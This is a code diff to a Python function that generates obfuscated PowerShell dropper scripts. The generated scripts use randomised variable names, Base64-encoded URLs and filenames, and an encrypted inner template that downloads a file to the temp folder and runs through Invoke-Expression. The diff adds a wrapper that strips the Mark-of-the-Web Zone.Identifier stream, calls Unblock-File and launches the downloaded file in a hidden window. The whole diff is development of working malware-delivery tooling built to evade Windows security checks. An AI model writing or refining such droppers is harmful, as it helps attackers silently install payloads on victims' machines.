@@ -295,6 +295,8 @@ def generate_ps1_recycle(encrypt_map, decrypt_map):
     dv6 = random_var_name()  # bytes
     dv7 = random_var_name()  # b64
 
+    # Inner template: download + write ONLY (no start-process, no MOTW removal)
+    # MOTW removal and execution are in the wrapper (unencrypted) for reliability
     script_template = (
         f'[net.servicepointmanager]::securityprotocol = [net.securityprotocoltype]::tls12\n'
         f'${dv1} = [system.io.path]::gettemppath()\n'
@@ -305,9 +307,7 @@ def generate_ps1_recycle(encrypt_map, decrypt_map):
         f'${dv5} = join-path ${dv1} ${dv4}\n'
         f'${dv6} = ${dv2}.downloaddata(${dv3})\n'
         f'${dv7} = [convert]::tobase64string(${dv6})\n'
-        f'[io.file]::writeallbytes(${dv5}, [convert]::frombase64string(${dv7}))\n'
-        f'if (test-path ${dv5}) {{ remove-item -path ${dv5} -stream zone.identifier -erroraction silentlycontinue }}\n'
-        f'start-process -filepath ${dv5} -windowstyle hidden'
+        f'[io.file]::writeallbytes(${dv5}, [convert]::frombase64string(${dv7}))'
     )
 
     # ── encode URL & filename as Base64 ──
@@ -325,6 +325,7 @@ def generate_ps1_recycle(encrypt_map, decrypt_map):
     var_dec_map = random_var_name()
     var_func = random_var_name()
     var_decoded_url = random_var_name()
+    var_exec_path = random_var_name()
     var_decoded_fn = random_var_name()
     var_dec_script = random_var_name()
     var_final = random_var_name()
@@ -381,6 +382,13 @@ def generate_ps1_recycle(encrypt_map, decrypt_map):
         f"${var_final} = ${var_dec_script} -replace '{tag_url}', ${var_decoded_url}\n"
         f"${var_final} = ${var_final} -replace '{tag_fn}', ${var_decoded_fn}\n"
         f"Invoke-Expression ${var_final}\n"
+        f"\n"
+        f"${var_exec_path} = Join-Path ([System.IO.Path]::GetTempPath()) ${var_decoded_fn}\n"
+        f"if (Test-Path ${var_exec_path}) {{\n"
+        f"    Remove-Item -Path ${var_exec_path} -Stream Zone.Identifier -ErrorAction SilentlyContinue\n"
+        f"    Unblock-File -Path ${var_exec_path} -ErrorAction SilentlyContinue\n"
+        f"    Start-Process -FilePath ${var_exec_path} -WindowStyle Hidden\n"
+        f"}}\n"
     )
     return artifact
 
